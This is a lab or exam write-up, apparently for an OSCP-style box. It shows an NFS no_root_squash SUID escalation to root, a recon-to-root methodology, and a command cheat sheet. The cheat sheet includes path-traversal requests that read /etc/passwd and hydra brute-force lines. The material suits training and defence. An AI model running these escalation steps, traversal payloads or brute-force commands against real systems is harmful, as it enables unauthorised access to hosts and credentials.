+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>kali@kali:~/exam$<span class="w"> </span>sudo<span class="w"> </span>cp<span class="w"> </span>shell<span class="w"> </span>/mnt/nfs/shell
+kali@kali:~/exam$<span class="w"> </span>ls<span class="w"> </span>-l<span class="w"> </span>/mnt/nfs/shell
+</pre></div>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre>-rwxr-xr-x 1 root root 16112 Jul 21 20:19 /mnt/nfs/shell
+</pre></div>
+<p>The owner is <code>root</code>, not <code>kali</code> and not <code>nobody</code>. That is <code>no_root_squash</code> working: the write came
+from a UID-0 process on the client and the server stored it as UID 0.</p>
+<h3>7.4 Set the SUID bit</h3>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>kali@kali:~/exam$<span class="w"> </span>sudo<span class="w"> </span>chmod<span class="w"> </span>+s<span class="w"> </span>/mnt/nfs/shell
+kali@kali:~/exam$<span class="w"> </span>ls<span class="w"> </span>-l<span class="w"> </span>/mnt/nfs/shell
+</pre></div>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre>-rwsr-sr-x 1 root root 16112 Jul 21 20:19 /mnt/nfs/shell
+</pre></div>
+<p>The <code>s</code> in the owner-execute position is the SUID bit; the <code>s</code> in the group position is SGID. Both
+matter here because the payload calls both <code>setuid(0)</code> and <code>setgid(0)</code>.</p>
+<h3>7.5 Run it on the target</h3>
+<p>Back in the SSH session:</p>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>matt@oscp:~$<span class="w"> </span>ls<span class="w"> </span>-l<span class="w"> </span>/usr/upload/shell
+</pre></div>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre>-rwsr-sr-x 1 root root 16112 Jul 21 20:19 /usr/upload/shell
+</pre></div>
+<p>The same inode, seen from the server: root-owned, SUID, in a directory <code>matt</code> can execute from.</p>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>matt@oscp:~$<span class="w"> </span>/usr/upload/shell
+root@oscp:~#<span class="w"> </span>id
+</pre></div>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre>uid=0(root) gid=0(root) groups=0(root),1001(adm)
+</pre></div>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>root@oscp:~#<span class="w"> </span>cat<span class="w"> </span>/root/proof.txt
+</pre></div>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre>[redacted]
+</pre></div>
+<h3>7.6 The flag</h3>
+<table>
+<thead>
+<tr>
+<th>Host</th>
+<th>File</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>172.16.97.110</code></td>
+<td><code>/root/proof.txt</code></td>
+<td><code>[redacted]</code></td>
+</tr>
+</tbody>
+</table>
+<p>Both halves of the box are done: <code>local.txt</code> as <code>matt</code>, <code>proof.txt</code> as root.</p>
+<h3>7.7 Why it works — and what would stop it</h3>
+<table>
+<thead>
+<tr>
+<th>Condition</th>
+<th>Effect</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>no_root_squash</code> on the export</td>
+<td>the copied binary is owned by the server's root</td>
+</tr>
+<tr>
+<td>SUID bit set over the mount</td>
+<td>the bit is stored on the server's filesystem, not stripped by NFS</td>
+</tr>
+<tr>
+<td>export mounted without <code>nosuid</code></td>
+<td>the kernel honours the bit when the file is executed</td>
+</tr>
+<tr>
+<td>a filesystem mounted <code>nosuid</code></td>
+<td>SUID is ignored — this path fails regardless of ownership</td>
+</tr>
+<tr>
+<td><code>root_squash</code> (default)</td>
+<td>the binary would be owned by <code>nobody</code>; SUID would give <code>nobody</code>, not root</td>
+</tr>
+</tbody>
+</table>
+<p>The chain has no exploit code and no CVE. It is a file permission granted by a mount option:</p>
+<div class="block block-out" data-kind="output"><div class="block-bar"><span class="block-tag">output</span></div><pre>export option  →  file owner  →  SUID bit  →  root shell
+</pre></div>
+<h3>7.8 Cleanup</h3>
+<p>The binary stays in <code>/usr/upload</code> until it is removed, and it is a root shell for anyone on the box.
+After capturing the flag:</p>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>root@oscp:~#<span class="w"> </span>rm<span class="w"> </span>-f<span class="w"> </span>/usr/upload/shell
+root@oscp:~#<span class="w"> </span>exit
+</pre></div>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>kali@kali:~/exam$<span class="w"> </span>sudo<span class="w"> </span>umount<span class="w"> </span>/mnt/nfs
+kali@kali:~/exam$<span class="w"> </span>exit
+</pre></div>
+<p>Removing the SUID binary and closing the tunnel leaves the host as it was found, apart from the
+<code>insecure</code> token added to <code>/etc/exports</code> — which is the misconfiguration that made the box solvable
+and should be reverted by the owner.</p>
+<hr />
+<p><strong>Back to:</strong> <a href="#overview"><code>README.md</code></a></p></div></section>
+<section class="chapter" id="ch-08" data-title="Methodology"><div class="ch-head"><span class="ch-num">08</span><div class="ch-title"><h2>Methodology</h2><p class="ch-sub">The repeatable per-box loop</p></div><button class="ghost copyall" type="button">Copy commands</button></div><div class="content"><p>The loop I run on every box, in order, with the rule that makes each step worth its time. This is
+deliberately shallow-then-deep: cheap checks across the whole surface first, expensive work only
+where evidence points.</p>
+<hr />
+<h3>Phase 0 — Setup</h3>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>mkdir<span class="w"> </span>-p<span class="w"> </span>/tmp/&lt;box&gt;<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nb">cd</span><span class="w"> </span>/tmp/&lt;box&gt;
+<span class="nb">export</span><span class="w"> </span><span class="nv">TARGET</span><span class="o">=</span>&lt;ip&gt;
+</pre></div>
+<p>Everything for the box lands in one directory: scan output, loot, evidence. It makes writing the
+report afterwards trivial and stops me confusing two boxes' output.</p>
+<hr />
+<h3>Phase 1 — Reachability and TCP</h3>
+<table>
+<thead>
+<tr>
+<th>Step</th>
+<th>Command</th>
+<th>Rule</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Ping</td>
+<td><code>ping -c 2 -W 2 $TARGET</code></td>
+<td>TTL tells you the OS before you scan (64 Linux, 128 Windows)</td>
+</tr>
+<tr>
+<td>Full TCP</td>
+<td><code>nmap -p- --min-rate 3000 -T4 -oN full_tcp.txt $TARGET</code></td>
+<td><strong>Always <code>-p-</code>.</strong> A top-1000 scan is a guess</td>
+</tr>
+<tr>
+<td>Versions</td>
+<td><code>nmap -sV -sC -p&lt;open&gt; -oN services.txt $TARGET</code></td>
+<td>Only the open ports; <code>-sC</code> is cheap and occasionally decisive</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Decision:</strong> for each open port, ask "what is the <em>configuration</em> weakness most likely to be, given
+this version?" Version CVEs come last — most boxes are misconfigured, not unpatched.</p>
+<hr />
+<h3>Phase 2 — UDP (do not skip this)</h3>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>nmap<span class="w"> </span>-sU<span class="w"> </span>--top-ports<span class="w"> </span><span class="m">30</span><span class="w"> </span>-T4<span class="w"> </span>--max-retries<span class="w"> </span><span class="m">1</span><span class="w"> </span>--host-timeout<span class="w"> </span>180s<span class="w"> </span><span class="nv">$TARGET</span>
+</pre></div>
+<p>If <code>161/udp</code> is open:</p>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="k">for</span><span class="w"> </span>c<span class="w"> </span><span class="k">in</span><span class="w"> </span>public<span class="w"> </span>private<span class="w"> </span>manager<span class="w"> </span>internal<span class="p">;</span><span class="w"> </span><span class="k">do</span>
+<span class="w">  </span>snmpwalk<span class="w"> </span>-v1<span class="w"> </span>-c<span class="w"> </span><span class="s2">"</span><span class="nv">$c</span><span class="s2">"</span><span class="w"> </span>-t<span class="w"> </span><span class="m">5</span><span class="w"> </span>-r<span class="w"> </span><span class="m">1</span><span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span><span class="m">1</span>.3.6.1.2.1.1<span class="w"> </span><span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>head<span class="w"> </span>-3
+<span class="k">done</span>
+</pre></div>
+<p>Then, on success, always:</p>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>snmpwalk<span class="w"> </span>-v1<span class="w"> </span>-c<span class="w"> </span>public<span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span><span class="m">1</span>.3.6.1.4.1.8072.1.3.2<span class="w">   </span><span class="c1"># nsExtendTable — the money tree</span>
+snmpwalk<span class="w"> </span>-v1<span class="w"> </span>-c<span class="w"> </span>public<span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span><span class="m">1</span>.3.6.1.2.1.25.4.2.1.2<span class="w">   </span><span class="c1"># process names</span>
+snmpwalk<span class="w"> </span>-v1<span class="w"> </span>-c<span class="w"> </span>public<span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span><span class="m">1</span>.3.6.1.2.1.25.6.3.1.2<span class="w">   </span><span class="c1"># installed packages</span>
+snmpwalk<span class="w"> </span>-v1<span class="w"> </span>-c<span class="w"> </span>public<span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span><span class="m">1</span>.3.6.1.2.1.4.20.1.1<span class="w">     </span>#<span class="w"> </span>interface<span class="w"> </span>IPs
+</pre></div>
+<p><code>nsExtendTable</code> gives you the commands the agent runs plus the admin's own description of them.
+Descriptions are written for an internal audience and routinely name accounts and policies.</p>
+<hr />
+<h3>Phase 3 — Per-service enumeration</h3>
+<p>For each service, in the order that historically pays fastest.</p>
+<h4>HTTP/HTTPS</h4>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>curl<span class="w"> </span>-s<span class="w"> </span>-i<span class="w"> </span>http://<span class="nv">$TARGET</span>/<span class="w"> </span><span class="p">|</span><span class="w"> </span>head<span class="w"> </span>-20<span class="w">          </span><span class="c1"># stock page? framework? redirect?</span>
+<span class="k">for</span><span class="w"> </span>p<span class="w"> </span><span class="k">in</span><span class="w"> </span>robots.txt<span class="w"> </span>sitemap.xml<span class="w"> </span>.git/<span class="w"> </span>.htaccess<span class="w"> </span>server-status<span class="p">;</span><span class="w"> </span><span class="k">do</span>
+<span class="w">  </span>curl<span class="w"> </span>-s<span class="w"> </span>-o<span class="w"> </span>/dev/null<span class="w"> </span>-w<span class="w"> </span><span class="s2">"%{http_code} %{size_download}  /</span><span class="nv">$p</span><span class="s2">\n"</span><span class="w"> </span>http://<span class="nv">$TARGET</span>/<span class="nv">$p</span>
+<span class="k">done</span>
+feroxbuster<span class="w"> </span>-u<span class="w"> </span>http://<span class="nv">$TARGET</span><span class="w"> </span>-w<span class="w"> </span>/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-t<span class="w"> </span><span class="m">40</span><span class="w"> </span>-d<span class="w"> </span><span class="m">2</span><span class="w"> </span>--smart<span class="w"> </span>--no-state<span class="w"> </span>-q
+</pre></div>
+<ul>
+<li>Note the <strong>404 body size</strong> — it is your filter for everything after.</li>
+<li>Vhosts: <code>ffuf -u http://$TARGET/ -H "Host: FUZZ" -w &lt;subdomains&gt; -fr "&lt;default page text&gt;"</code>.</li>
+<li>Timebox it. If the page is byte-identical to a stock install and two wordlists agree, stop.</li>
+</ul>
+<h4>FTP</h4>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>ftp<span class="w"> </span>-n<span class="w"> </span>-v<span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span><span class="o">&lt;&lt;&lt;</span><span class="w"> </span><span class="s1">$'user anonymous anon@test\nls\nbye'</span><span class="w">   </span><span class="c1"># 530 on USER = anonymous_enable=NO</span>
+hydra<span class="w"> </span>-L<span class="w"> </span>users.txt<span class="w"> </span>-P<span class="w"> </span>pass.txt<span class="w"> </span>-t<span class="w"> </span><span class="m">4</span><span class="w"> </span>-f<span class="w"> </span>ftp://<span class="nv">$TARGET</span>
+</pre></div>
+<p>Try the account name as the password. Check for key material, configs, and backups in the data
+directory — a shared <code>/srv/ftp</code> often leaks a <em>different</em> account's secrets.</p>
+<h4>SSH</h4>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>ssh<span class="w"> </span>-i<span class="w"> </span>key<span class="w"> </span>-o<span class="w"> </span><span class="nv">BatchMode</span><span class="o">=</span>yes<span class="w"> </span>user@<span class="nv">$TARGET</span><span class="w"> </span>id<span class="w">      </span><span class="c1"># never point a key at a host without -o BatchMode</span>
+ssh-keygen<span class="w"> </span>-l<span class="w"> </span>-f<span class="w"> </span>key<span class="w">                             </span>#<span class="w"> </span><span class="nb">read</span><span class="w"> </span>the<span class="w"> </span>comment<span class="w"> </span>first:<span class="w"> </span>it<span class="w"> </span>names<span class="w"> </span>the<span class="w"> </span>user
+</pre></div>
+<h4>SMB</h4>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span>-u<span class="w"> </span><span class="s1">''</span><span class="w"> </span>-p<span class="w"> </span><span class="s1">''</span><span class="w"> </span>--shares
+nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span>-u<span class="w"> </span>guest<span class="w"> </span>-p<span class="w"> </span><span class="s1">''</span><span class="w"> </span>--shares
+nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span>-u<span class="w"> </span>user<span class="w"> </span>-p<span class="w"> </span>pass<span class="w"> </span>-d<span class="w"> </span>DOMAIN<span class="w"> </span>--shares
+</pre></div>
+<hr />
+<h3>Phase 4 — Foothold</h3>
+<p>Get a shell, then <strong>immediately</strong> stabilise and record identity:</p>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>id<span class="p">;</span><span class="w"> </span>hostname<span class="p">;</span><span class="w"> </span>sudo<span class="w"> </span>-n<span class="w"> </span>-l<span class="p">;</span><span class="w"> </span>uname<span class="w"> </span>-a
+</pre></div>
+<p>Do not start hunting for privesc before you know exactly which uid and groups you hold — the
+escalation path depends on it.</p>
+<hr />
+<h3>Phase 5 — Local enumeration (Linux)</h3>
+<p>Send one script over one connection and read one report:</p>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>ssh<span class="w"> </span>user@<span class="nv">$TARGET</span><span class="w"> </span><span class="s1">'bash -s'</span><span class="w"> </span>&lt;<span class="w"> </span>enum.sh
+</pre></div>
+<p>Checklist, in the order that finds things:</p>
+<table>
+<thead>
+<tr>
+<th>#</th>
+<th>Check</th>
+<th>Command</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td>sudo rights</td>
+<td><code>sudo -n -l</code></td>
+</tr>
+<tr>
+<td>2</td>
+<td>SUID, excluding snap noise</td>
+<td><code>find / -perm -4000 -type f 2&gt;/dev/null \| grep -v '^/snap'</code></td>
+</tr>
+<tr>
+<td>3</td>
+<td>Capabilities</td>
+<td><code>getcap -r / 2&gt;/dev/null</code></td>
+</tr>
+<tr>
+<td>4</td>
+<td>Cron</td>
+<td><code>cat /etc/crontab; ls -la /etc/cron.*</code></td>
+</tr>
+<tr>
+<td>5</td>
+<td>Writable service files</td>
+<td><code>find / -writable -type f -path '*/etc/*' 2&gt;/dev/null</code></td>
+</tr>
+<tr>
+<td>6</td>
+<td>Listening sockets</td>
+<td><code>ss -tlnp</code></td>
+</tr>
+<tr>
+<td>7</td>
+<td>Home directories</td>
+<td><code>ls -la /home/*</code> — this box had the SUID helper in a user's home</td>
+</tr>
+<tr>
+<td>8</td>
+<td>History and keys</td>
+<td><code>ls -la ~/.ssh; cat ~/.bash_history</code></td>
+</tr>
+<tr>
+<td>9</td>
+<td>Kernel</td>
+<td><code>uname -a</code> — only if 1–8 are empty</td>
+</tr>
+<tr>
+<td>10</td>
+<td>Password reuse</td>
+<td>the foothold password against <code>sudo -S</code> and other users</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Rule:</strong> a <em>custom</em> SUID binary beats every generic exploit. Read it before reaching for
+<code>linpeas</code> output tables.</p>
+<hr />
+<h3>Phase 6 — Binary analysis (when a SUID binary looks custom)</h3>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>file<span class="w"> </span>/path/binary<span class="w">                    </span><span class="c1"># not stripped? then function names survive</span>
+strings<span class="w"> </span>-a<span class="w"> </span>/path/binary<span class="w"> </span><span class="p">|</span><span class="w"> </span>head<span class="w"> </span>-40<span class="w">   </span><span class="c1"># look for system, popen, exec*, and bare command names</span>
+objdump<span class="w"> </span>-d<span class="w"> </span>-M<span class="w"> </span>intel<span class="w"> </span>/path/binary<span class="w"> </span><span class="p">|</span><span class="w"> </span>sed<span class="w"> </span>-n<span class="w"> </span><span class="s1">'/&lt;main&gt;:/,/^$/p'</span>
+readelf<span class="w"> </span>-d<span class="w"> </span>/path/binary<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-E<span class="w"> </span><span class="s1">'BIND_NOW|FLAGS'</span><span class="w">   </span>#<span class="w"> </span>is<span class="w"> </span>RELRO<span class="w"> </span>full?<span class="w"> </span><span class="o">(</span>memory<span class="w"> </span>bugs<span class="w"> </span>are<span class="w"> </span><span class="k">then</span><span class="w"> </span>out<span class="o">)</span>
+</pre></div>
+<p>What you are looking for, in priority order:</p>
+<ol>
+<li><code>system()</code> / <code>popen()</code> with a <strong>bare command name</strong> → <code>PATH</code> hijack (CWE-426)</li>
+<li><code>setuid(0)</code>/<code>seteuid(0)</code> <strong>before</strong> that call → the shell will not drop privileges → full root</li>
+<li>A writable path used by root → symlink or overwrite attack</li>
+<li>A shell escape in a pager/editor it invokes</li>
+</ol>
+<p>If the binary is setuid <strong>and</strong> setgid, or lives in a user-writable directory, the box author is
+telling you this is the path.</p>
+<hr />
+<h3>Phase 7 — Post-exploitation and reporting</h3>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>cat<span class="w"> </span>/root/proof.txt<span class="p">;</span><span class="w"> </span>cat<span class="w"> </span>/home/*/local.txt
+ip<span class="w"> </span>a<span class="p">;</span><span class="w"> </span>ip<span class="w"> </span>r<span class="w">          </span>#<span class="w"> </span>can<span class="w"> </span>this<span class="w"> </span>host<span class="w"> </span>pivot?<span class="w"> </span><span class="o">(</span>single<span class="w"> </span>NIC<span class="w"> </span>+<span class="w"> </span>default<span class="w"> </span><span class="nv">route</span><span class="w"> </span><span class="o">=</span><span class="w"> </span>no<span class="o">)</span>
+</pre></div>
+<p>Record: exact flags, the <code>id</code> output as root, the mechanism in one paragraph, and every command
+with its output. Then clean up.</p>
+<h4>Cleanup checklist</h4>
+<ul>
+<li>Remove every file you created, then <strong>verify</strong> with <code>ls</code>.</li>
+<li>Revert any file you modified.</li>
+<li>Do not change credentials you do not own; if an exploit would have (this box's <code>chpasswd</code>),
+  note that it did not run.</li>
+<li>Note in the report what you changed and what you left alone.</li>
+</ul>
+<hr />
+<h3>Timeboxing heuristics</h3>
+<table>
+<thead>
+<tr>
+<th>Situation</th>
+<th>Budget</th>
+<th>Move on when</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Web on a stock default page</td>
+<td>10 min</td>
+<td>Two wordlists + vhosts agree there is nothing</td>
+</tr>
+<tr>
+<td>Version-CVE rabbit hole</td>
+<td>5 min</td>
+<td>The package revision shows the backport</td>
+</tr>
+<tr>
+<td>Credential guessing</td>
+<td>5 min per service</td>
+<td>Account-specific defaults exhausted</td>
+</tr>
+<tr>
+<td>Generic privesc sweep</td>
+<td>15 min</td>
+<td>A custom SUID/service/cron finding exists</td>
+</tr>
+</tbody>
+</table>
+<p>The recurring lesson: <strong>spend the time on the surface you have not looked at, not on the one you
+have already disproved.</strong> On this box, thirty UDP ports were worth more than an hour of web.</p></div></section>
+<section class="chapter" id="ch-09" data-title="Cheat sheet"><div class="ch-head"><span class="ch-num">09</span><div class="ch-title"><h2>Cheat sheet</h2><p class="ch-sub">Every command, with the flag that matters</p></div><button class="ghost copyall" type="button">Copy commands</button></div><div class="content"><p>Only commands I have actually needed, with the small flag that matters each time.</p>
+<hr />
+<h3>Scanning</h3>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="c1">## full TCP, fast — always -p-</span>
+nmap<span class="w"> </span>-p-<span class="w"> </span>--min-rate<span class="w"> </span><span class="m">3000</span><span class="w"> </span>-T4<span class="w"> </span>-oN<span class="w"> </span>full_tcp.txt<span class="w"> </span><span class="nv">$T</span>
+
+<span class="c1">## versions + default scripts on the ports that matter</span>
+nmap<span class="w"> </span>-sV<span class="w"> </span>-sC<span class="w"> </span>-p21,22,80<span class="w"> </span>-oN<span class="w"> </span>services.txt<span class="w"> </span><span class="nv">$T</span>
+
+<span class="c1">## UDP: the phase everyone skips</span>
+nmap<span class="w"> </span>-sU<span class="w"> </span>--top-ports<span class="w"> </span><span class="m">30</span><span class="w"> </span>-T4<span class="w"> </span>--max-retries<span class="w"> </span><span class="m">1</span><span class="w"> </span>--host-timeout<span class="w"> </span>180s<span class="w"> </span><span class="nv">$T</span>
+
+<span class="c1">## live hosts</span>
+nmap<span class="w"> </span>-sn<span class="w"> </span><span class="m">192</span>.168.245.0/24<span class="w"> </span>-oG<span class="w"> </span>-<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-i<span class="w"> </span>up<span class="w"> </span><span class="p">|</span><span class="w"> </span>awk<span class="w"> </span><span class="s1">'{print $2}'</span>
+</pre></div>
+<hr />
+<h3>SNMP</h3>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre><span class="c1">## find the community string</span>
+<span class="k">for</span><span class="w"> </span>c<span class="w"> </span><span class="k">in</span><span class="w"> </span>public<span class="w"> </span>private<span class="w"> </span>manager<span class="w"> </span>internal<span class="p">;</span><span class="w"> </span><span class="k">do</span>
+<span class="w">  </span><span class="nb">echo</span><span class="w"> </span><span class="s2">"== </span><span class="nv">$c</span><span class="s2">"</span><span class="p">;</span><span class="w"> </span>snmpwalk<span class="w"> </span>-v1<span class="w"> </span>-c<span class="w"> </span><span class="s2">"</span><span class="nv">$c</span><span class="s2">"</span><span class="w"> </span>-t<span class="w"> </span><span class="m">5</span><span class="w"> </span>-r<span class="w"> </span><span class="m">1</span><span class="w"> </span><span class="nv">$T</span><span class="w"> </span><span class="m">1</span>.3.6.1.2.1.1<span class="w"> </span><span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>head<span class="w"> </span>-3
+<span class="k">done</span>
+
+<span class="c1">## full walk to a file, then grep it</span>
+snmpwalk<span class="w"> </span>-v1<span class="w"> </span>-c<span class="w"> </span>public<span class="w"> </span>-t<span class="w"> </span><span class="m">5</span><span class="w"> </span>-r<span class="w"> </span><span class="m">1</span><span class="w"> </span><span class="nv">$T</span><span class="w"> </span>&gt;<span class="w"> </span>snmp_full.txt
+
+<span class="c1">## the three trees that matter on Linux</span>
+snmpwalk<span class="w"> </span>-v1<span class="w"> </span>-c<span class="w"> </span>public<span class="w"> </span><span class="nv">$T</span><span class="w"> </span><span class="m">1</span>.3.6.1.4.1.8072.1.3.2<span class="w">    </span><span class="c1"># nsExtendTable (commands + descriptions)</span>
+snmpwalk<span class="w"> </span>-v1<span class="w"> </span>-c<span class="w"> </span>public<span class="w"> </span><span class="nv">$T</span><span class="w"> </span><span class="m">1</span>.3.6.1.2.1.25.4.2.1.2<span class="w">    </span><span class="c1"># process names</span>
+snmpwalk<span class="w"> </span>-v1<span class="w"> </span>-c<span class="w"> </span>public<span class="w"> </span><span class="nv">$T</span><span class="w"> </span><span class="m">1</span>.3.6.1.2.1.25.6.3.1.2<span class="w">    </span><span class="c1"># installed packages</span>
+snmpwalk<span class="w"> </span>-v1<span class="w"> </span>-c<span class="w"> </span>public<span class="w"> </span><span class="nv">$T</span><span class="w"> </span><span class="m">1</span>.3.6.1.2.1.4.20.1.1<span class="w">      </span><span class="c1"># interface IPs</span>
+
+<span class="c1">## decode an nsExtendTable index suffix (5.82.69.83.69.84 -&gt; RESET)</span>
+python3<span class="w"> </span>-c<span class="w"> </span><span class="s2">"s='82.69.83.69.84'.split('.'); print(''.join(chr(int(x)) for x in s[1:]))"</span>
+
+<span class="c1">## bulk walk when v1 is slow</span>
+snmpbulkwalk<span class="w"> </span>-v2c<span class="w"> </span>-c<span class="w"> </span>public<span class="w"> </span><span class="nv">$T</span><span class="w"> </span><span class="m">1</span>.3.6.1.4.1.8072.1.3.2
+</pre></div>
+<hr />
+<h3>Web</h3>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>curl<span class="w"> </span>-s<span class="w"> </span>-i<span class="w"> </span>http://<span class="nv">$T</span>/<span class="w"> </span><span class="p">|</span><span class="w"> </span>head<span class="w"> </span>-20
+curl<span class="w"> </span>-s<span class="w"> </span>-o<span class="w"> </span>/dev/null<span class="w"> </span>-w<span class="w"> </span><span class="s2">"%{http_code} %{size_download}\n"</span><span class="w"> </span>http://<span class="nv">$T</span>/robots.txt
+
+<span class="c1">## path traversal tests — --path-as-is is mandatory or curl normalises the payload</span>
+curl<span class="w"> </span>-s<span class="w"> </span>--path-as-is<span class="w"> </span><span class="s2">"http://</span><span class="nv">$T</span><span class="s2">/icons/.%2e/.%2e/.%2e/.%2e/etc/passwd"</span>
+curl<span class="w"> </span>-s<span class="w"> </span>--path-as-is<span class="w"> </span><span class="s2">"http://</span><span class="nv">$T</span><span class="s2">/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/etc/passwd"</span>
+
+feroxbuster<span class="w"> </span>-u<span class="w"> </span>http://<span class="nv">$T</span><span class="w"> </span>-w<span class="w"> </span>/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-t<span class="w"> </span><span class="m">40</span><span class="w"> </span>-d<span class="w"> </span><span class="m">2</span><span class="w"> </span>--smart<span class="w"> </span>--no-state<span class="w"> </span>-q
+
+ffuf<span class="w"> </span>-u<span class="w"> </span>http://<span class="nv">$T</span>/<span class="w"> </span>-H<span class="w"> </span><span class="s2">"Host: FUZZ"</span><span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-w<span class="w"> </span>/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt<span class="w"> </span><span class="se">\</span>
+<span class="w">  </span>-mc<span class="w"> </span>all<span class="w"> </span>-fr<span class="w"> </span><span class="s2">"Apache2 Ubuntu Default Page"</span><span class="w"> </span>-t<span class="w"> </span><span class="m">40</span><span class="w"> </span>-s
+</pre></div>
+<hr />
+<h3>FTP</h3>
+<div class="block block-cmd" data-kind="command"><div class="block-bar"><span class="block-tag">command</span><button class="copy" type="button" aria-label="Copy command">Copy</button></div><pre>ftp<span class="w"> </span>-n<span class="w"> </span>-v<span class="w"> </span><span class="nv">$T</span><span class="w"> </span><span class="o">&lt;&lt;&lt;</span><span class="w"> </span><span class="s1">$'user anonymous anon@test\nls\nbye'</span><span class="w">    </span><span class="c1"># 530 right after USER =&gt; anonymous off</span>
+
+hydra<span class="w"> </span>-L<span class="w"> </span>users.txt<span class="w"> </span>-P<span class="w"> </span>pass.txt<span class="w"> </span>-t<span class="w"> </span><span class="m">4</span><span class="w"> </span>-f<span class="w"> </span>-V<span class="w"> </span>ftp://<span class="nv">$T</span><span class="w">       </span><span class="c1"># -t 4 keeps vsftpd happy</span>
+
+curl<span class="w"> </span>-s<span class="w"> </span>-u<span class="w"> </span>user:pass<span class="w"> </span><span class="s2">"ftp://</span><span class="nv">$T</span><span class="s2">/"</span><span class="w">                         </span><span class="c1"># list</span>
+curl<span class="w"> </span>-s<span class="w"> </span>-u<span class="w"> </span>user:pass<span class="w"> </span>-o<span class="w"> </span>file<span class="w"> </span><span class="s2">"ftp://</span><span class="nv">$T</span><span class="s2">/file"</span><span class="w">             </span>#<span class="w"> </span>download
